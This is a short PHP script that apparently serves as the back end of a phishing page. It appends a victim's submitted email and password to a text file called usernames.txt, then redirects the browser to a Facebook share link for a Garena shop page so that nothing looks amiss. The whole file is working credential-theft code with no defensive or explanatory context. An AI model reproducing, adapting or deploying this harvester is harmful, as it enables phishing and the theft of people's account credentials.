<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/sharer/sharer.php?u=https://shop.garena.sg/app');
exit();
